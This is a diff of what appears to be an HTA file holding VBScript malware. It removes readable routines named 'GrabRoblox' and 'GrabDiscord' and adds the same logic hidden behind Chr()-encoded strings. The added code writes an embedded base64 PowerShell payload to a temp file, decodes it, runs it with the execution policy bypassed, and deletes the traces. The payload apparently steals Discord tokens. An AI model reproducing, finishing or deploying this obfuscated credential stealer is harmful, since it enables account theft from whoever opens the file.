+X19 = X19 & (Chr(90)&Chr(87)&Chr(53)&Chr(104)&Chr(89)&Chr(109)&Chr(120)&Chr(108)&Chr(90)&Chr(67)&Chr(107)&Chr(103)&Chr(101)&Chr(121)&Chr(65)&Chr(107)&Chr(90)&Chr(67)&Chr(65)&Chr(114)&Chr(80)&Chr(83)&Chr(65)&Chr(105)&Chr(89)&Chr(71)&Chr(52)&Chr(113)&Chr(75)&Chr(106)&Chr(74)&Chr(71)&Chr(81)&Chr(84)&Chr(111)&Chr(113)&Chr(75)&Chr(105)&Chr(66)&Chr(70)&Chr(98)&Chr(109)&Chr(70)&Chr(105)&Chr(98)&Chr(71)&Chr(86)&Chr(107)&Chr(73)&Chr(105)&Chr(66)&Chr(57)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(74)&Chr(71)&Chr(78)&Chr(105)&Chr(73)&Chr(68)&Chr(48)&Chr(103))
+X19 = X19 & (Chr(74)&Chr(50)&Chr(66)&Chr(103)&Chr(89)&Chr(67)&Chr(99)&Chr(103)&Chr(75)&Chr(121)&Chr(65)&Chr(107)&Chr(100)&Chr(105)&Chr(53)&Chr(85)&Chr(98)&Chr(50)&Chr(116)&Chr(108)&Chr(98)&Chr(105)&Chr(65)&Chr(114)&Chr(73)&Chr(67)&Chr(100)&Chr(103)&Chr(89)&Chr(71)&Chr(65)&Chr(110)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(85)&Chr(71)&Chr(57)&Chr(122)&Chr(100)&Chr(67)&Chr(49)&Chr(70)&Chr(98)&Chr(87)&Chr(74)&Chr(108)&Chr(90)&Chr(67)&Chr(65)&Chr(110)&Chr(82)&Chr(71)&Chr(108)&Chr(122)&Chr(89)&Chr(50)&Chr(57)&Chr(121)&Chr(90)&Chr(67)&Chr(66)&Chr(85))
+X19 = X19 & (Chr(98)&Chr(50)&Chr(116)&Chr(108)&Chr(98)&Chr(105)&Chr(99)&Chr(103)&Chr(74)&Chr(71)&Chr(81)&Chr(103)&Chr(77)&Chr(84)&Chr(89)&Chr(51)&Chr(77)&Chr(84)&Chr(69)&Chr(50)&Chr(79)&Chr(68)&Chr(65)&Chr(103)&Chr(74)&Chr(71)&Chr(78)&Chr(105)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(57)&Chr(67)&Chr(110)&Chr(48)&Chr(75))
 
-' === GRABBER DISCORD ===
-Sub GrabDiscord()
-    On Error Resume Next
-    Dim b64file: b64file = TmpFile("dg.b64")
-    WriteFile b64file, DG_B64
-    Dim psfile: psfile = TmpFile("dg.ps1")
-    fso.DeleteFile psfile, True
-    RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -Command ""[IO.File]::WriteAllBytes('" & psfile & "',[Convert]::FromBase64String((Get-Content '" & b64file & "' -Raw).Trim()))"""
-    If fso.FileExists(psfile) Then
-        RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psfile & """"
+Sub X13()
+    Execute (Chr(79)&Chr(110)&Chr(32)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(82)&Chr(101)&Chr(115)&Chr(117)&Chr(109)&Chr(101)&Chr(32)&Chr(78)&Chr(101)&Chr(120)&Chr(116))
+    Dim X69: X69 = X7((Chr(100)&Chr(103)&Chr(46)&Chr(98)&Chr(54)&Chr(52)))
+    X8 X69, X19
+    Dim X70: X70 = X7((Chr(100)&Chr(103)&Chr(46)&Chr(112)&Chr(115)&Chr(49)))
+    X15.DeleteFile X70, True
+    X6 (Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(80)&Chr(114)&Chr(111)&Chr(102)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(45)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(117)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(80)&Chr(111)&Chr(108)&Chr(105)&Chr(99)&Chr(121)&Chr(32)&Chr(66)&Chr(121)&Chr(112)&Chr(97)&Chr(115)&Chr(115)&Chr(32)&Chr(45)&Chr(67)&Chr(111)&Chr(109)&Chr(109)&Chr(97)&Chr(110)&Chr(100)&Chr(32)&Chr(34)&Chr(91)&Chr(73)&Chr(79)&Chr(46)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(93)&Chr(58)&Chr(58)&Chr(87)&Chr(114)&Chr(105)&Chr(116)&Chr(101)&Chr(65)&Chr(108)&Chr(108)&Chr(66)&Chr(121)&Chr(116)&Chr(101)&Chr(115)&Chr(40)&Chr(39)) & X70 & (Chr(39)&Chr(44)&Chr(91)&Chr(67)&Chr(111)&Chr(110)&Chr(118)&Chr(101)&Chr(114)&Chr(116)&Chr(93)&Chr(58)&Chr(58)&Chr(70)&Chr(114)&Chr(111)&Chr(109)&Chr(66)&Chr(97)&Chr(115)&Chr(101)&Chr(54)&Chr(52)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(40)&Chr(40)&Chr(71)&Chr(101)&Chr(116)&Chr(45)&Chr(67)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(32)&Chr(39)) & X69 & (Chr(39)&Chr(32)&Chr(45)&Chr(82)&Chr(97)&Chr(119)&Chr(41)&Chr(46)&Chr(84)&Chr(114)&Chr(105)&Chr(109)&Chr(40)&Chr(41)&Chr(41)&Chr(41)&Chr(34))
+    If X15.FileExists(X70) Then
+        X6 (Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(80)&Chr(114)&Chr(111)&Chr(102)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(45)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(117)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(80)&Chr(111)&Chr(108)&Chr(105)&Chr(99)&Chr(121)&Chr(32)&Chr(66)&Chr(121)&Chr(112)&Chr(97)&Chr(115)&Chr(115)&Chr(32)&Chr(45)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(34)) & X70 & (Chr(34))
     End If
-    fso.DeleteFile b64file, True
-    fso.DeleteFile psfile, True
+    X15.DeleteFile X69, True
+    X15.DeleteFile X70, True
 End Sub
 
-' === MAIN ===
-Call GrabRoblox
-Call GrabDiscord
+Call X2
+Call X13
 window.close()
 
 </script>
